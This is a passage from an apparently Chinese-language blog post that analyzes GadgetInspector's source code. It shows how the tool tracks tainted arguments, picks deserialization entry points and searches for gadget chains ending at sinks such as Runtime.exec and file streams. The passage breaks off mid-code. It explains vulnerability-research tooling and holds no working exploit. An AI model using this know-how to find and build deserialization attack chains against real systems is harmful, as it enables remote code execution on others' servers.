class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">            <span class="keyword">int</span> stackIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="comment">//最右边的参数，就是最后入栈，即在栈顶</span></span><br><span class="line">                <span class="keyword">int</span> argIndex = argTypes.length-<span class="number">1</span>-i;</span><br><span class="line">                Type type = argTypes[argIndex];</span><br><span class="line">                <span class="comment">//操作数栈出栈，调用方法前，参数都已入栈</span></span><br><span class="line">                Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                        <span class="comment">//取出出栈的参数，判断是否为当前方法的入参，arg前缀</span></span><br><span class="line">                        <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">"arg"</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid taint arg: "</span> + argSrc);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">int</span> dotIndex = argSrc.indexOf(<span class="string">'.'</span>);</span><br><span class="line">                        <span class="keyword">int</span> srcArgIndex;</span><br><span class="line">                        String srcArgPath;</span><br><span class="line">                        <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                            srcArgPath = <span class="keyword">null</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                            srcArgPath = argSrc.substring(dotIndex+<span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//记录参数流动关系</span></span><br><span class="line">                        <span class="comment">//argIndex：当前方法参数索引，srcArgIndex：对应上一级方法的参数索引</span></span><br><span class="line">                        discoveredCalls.add(<span class="keyword">new</span> GraphCall(</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(<span class="keyword">this</span>.owner), <span class="keyword">this</span>.name, <span class="keyword">this</span>.desc),</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc),</span><br><span class="line">                                srcArgIndex,</span><br><span class="line">                                srcArgPath,</span><br><span class="line">                                argIndex));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                stackIndex += type.getSize();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Unsupported opcode: "</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到此，gadgetinspector.CallGraphDiscovery#discover方法就结束了，然后执行gadgetinspector.CallGraphDiscovery#save对调用者-被调用者参数关系数据进行保存到callgraph.dat文件，其中数据的序列化输出格式，由GraphCall.Factory实现:</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201114033068.png" alt="image-20201201114033068"></p>
<p>数据格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用者类名 调用者方法caller 调用者方法描述 被调用者类名 被调用者方法target 被调用者方法描述 调用者方法参数索引 调用者字段名 被调用者方法参数索引</span><br><span class="line">Main (Ljava/lang/String;)<span class="function">V main A <span class="title">method1</span> <span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>; <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>





<h2 id="利用链入口搜索-SourceDiscovery"><a href="#利用链入口搜索-SourceDiscovery" class="headerlink" title="利用链入口搜索 SourceDiscovery"></a>利用链入口搜索 SourceDiscovery</h2><p>在这一个阶段中，会扫描所有的class，把符合，也就是可被反序列化并且可以在反序列化执行的方法，全部查找出来，因为没有这样的入口，就算存在执行链，也没办法通过反序列化的时候进行触发。</p>
<p>因为入口的触发，不同的反序列化方式会存在不同是实现，因此，在gadgetinspector中，存在着多个SourceDiscovery的实现，有jackson的，java原生序列化的等等，这里主要以jackson的SourceDiscovery实现开始分析。</p>
<p>这一步会根据已知的反序列化漏洞的入口，检查所有可以被触发的方法。例如，在利用链中使用代理时，任何可序列化并且是<code>java/lang/reflect/InvocationHandler</code>子类的invoke方法都可以视为source。这里还会根据具体的反序列化库决定类是否能被序列化。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202104444974.png" alt="image-20201202104444974"></p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202110221901.png" alt="image-20201202110221901"></p>
<p>这里就是首先去查看想要找哪一种类型的反序列化漏洞入口点，</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202110252070.png" alt="image-20201202110252070"></p>
<p>跟进config.getSourceDiscovery看一眼：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202110107440.png" alt="image-20201202110107440"></p>
<p>先看SourceDiscovery抽象类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Source&gt; discoveredSources = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">addDiscoveredSource</span><span class="params">(Source source)</span> </span>&#123;</span><br><span class="line">        discoveredSources.add(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        discover(classMap, methodMap, inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">"sources.dat"</span>), <span class="keyword">new</span> Source.Factory(), discoveredSources);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到它的discover实现中，加载了所有的类、方法、继承实现关系数据，接着调用抽象方法discover，然后，我们跟进jackson的具体实现中：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202104037072.png" alt="image-20201202104037072"></p>
<p>从上述代码可以看出，实现非常之简单，只是判断了方法：</p>
<ol>
<li>是否无参构造方法</li>
<li>是否getter方法</li>
<li>是否setter方法</li>
</ol>
<p>为什么对于source会做这样的判断？因为对于jackson的反序列化，在其反序列化时，必须通过无参构造方法反序列化（没有则会反序列化失败），并且会根据一定情况调用其反序列化对象的getter、setter方法。</p>
<p>这里SourceDiscovery是一个抽象类，具体情况具体继承分析，看一下它的的一个简单继承SimpleSourceDiscovery：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"finalize"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="comment">// 如果类实现了readObject，则传入的ObjectInputStream被认为是污染的</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"readObject"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/io/ObjectInputStream;)V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="comment">// 使用动态代理trick时，任何扩展了serializable and InvocationHandler的类会受到污染。</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/reflect/InvocationHandler"</span>))) &#123;</span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">"invoke"</span>, <span class="string">"(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;"</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects into a HashMap.</span></span><br><span class="line">        <span class="comment">// hashCode（）或equals（）是将对象放入HashMap的标准技巧的可访问入口点</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"hashCode"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()I"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"equals"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/lang/Object;)Z"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// 使用比较器代理，可以跳转到任何groovy Closure的call()/doCall()方法，所有的args都被污染</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/Closure"</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">"call"</span>) || method.getName().equals(<span class="string">"doCall"</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>在扫描所有的方法后，具备条件的method都会被添加到gadgetinspector.SourceDiscovery#discoveredSources中，并最后通过gadgetinspector.SourceDiscovery#save保存</p>
<p>最终输出到sources.dat文件的数据形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名 方法名 方法描述 污染参数索引</span><br></pre></td></tr></table></figure>



<h2 id="gadgets挖掘阶段-GadgetChainDiscovery"><a href="#gadgets挖掘阶段-GadgetChainDiscovery" class="headerlink" title="gadgets挖掘阶段-GadgetChainDiscovery"></a>gadgets挖掘阶段-GadgetChainDiscovery</h2><p>这一步会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。</p>
<p>分析gadgetinspector.GadgetChainDiscovery#discover代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);<span class="comment">//得到方法的所有子类方法实现（被子类重写的方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将方法的所有子类方法实现保存到methodimpl.dat</span></span><br><span class="line">        <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">"methodimpl.dat"</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法调用map，key为父方法，value为子方法与父方法参数传递关系</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">"callgraph.dat"</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">            MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="comment">//加载所有sources，并将每个source作为每条链的第一个节点</span></span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">"sources.dat"</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">            GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">//使用广度优先搜索所有从source到sink的调用链</span></span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">"Iteration "</span> + iteration + <span class="string">", Search space: "</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            GadgetChain chain = methodsToExplore.pop();<span class="comment">//从队首弹出一条链</span></span><br><span class="line">            GadgetChainLink lastLink = chain.links.get(chain.links.size()-<span class="number">1</span>);<span class="comment">//取这条链最后一个节点</span></span><br><span class="line"></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);<span class="comment">//获取当前节点方法所有子方法与当前节点方法参数传递关系</span></span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="comment">//如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());<span class="comment">//获取子方法所在类的所有子类重写方法</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());<span class="comment">//新方法节点</span></span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="comment">//如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加...</span></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);<span class="comment">//新节点与之前的链组成新链</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;<span class="comment">//如果到达了sink，则加入discoveredGadgets</span></span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//新链加入队列</span></span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            <span class="comment">//新节点加入已访问集合</span></span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保存搜索到的利用链到gadget-chains.txt</span></span><br><span class="line">        <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">"gadget-chains.txt"</span>));</span><br><span class="line">             Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>这里先看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(inheritanceMap, methodMap);</span><br></pre></td></tr></table></figure>

<p>这里是为了得到父类方法的所有子类方法实现（被子类重写的方法）</p>
<p>因为Java的继承特性，对于一个父类，它的方法实现，可以通过子孙类进行重写覆盖。</p>
<p>因为多态特性，实现类只有运行时可确定，因此，需要对其所有重写实现都形成分析链，就能确保在非运行时，做到gadget chain的挖掘。</p>
<p>分析InheritanceDeriver.getAllMethodImplementations代码：</p>
<p>首先获取类对应的方法集合，就是每个里面有哪些方法。</p>
<p>methodByClass：类名-类拥有的方法名</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322115045568.png" alt="image-20210322115045568" style="zoom:80%;">

<p>subClassMap：父类-继承的子孙类</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322115453899.png" alt="image-20210322115453899" style="zoom:80%;">



<p>接下来遍历methodMap中的每个方法，并通过查询继承了方法所属类的子孙类的方法实现，确定方法是否被重写，最后整合成 方法-&gt;重写的方法集 的映射集合，静态方法跳过，是不可被重写的。</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322131051058.png" alt="image-20210322131051058" style="zoom:80%;">



<p>保存的数据格式：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322132035155.png" alt="image-20210322132035155"></p>
<p>接下来整合：</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210322132556641.png" alt="image-20210322132556641" style="zoom:100%;">

<p>太晕了。。有时间整理。</p>
<p>作者给出的判断sink方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileInputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/io/FileOutputStream"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; (method.getName().equals(<span class="string">"newInputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newOutputStream"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedReader"</span>)</span><br><span class="line">                || method.getName().equals(<span class="string">"newBufferedWriter"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("forName")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if (method.getClassReference().getName().equals("java/lang/Class")</span></span><br><span class="line"><span class="comment">                &amp;&amp; method.getName().equals("getMethod")) &#123;</span></span><br><span class="line"><span class="comment">            return true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we</span></span><br><span class="line">        <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">        <span class="comment">// method is being invoked, we don't mark that as interesting.</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/reflect/Method"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invoke"</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URLClassLoader"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newInstance"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/System"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span 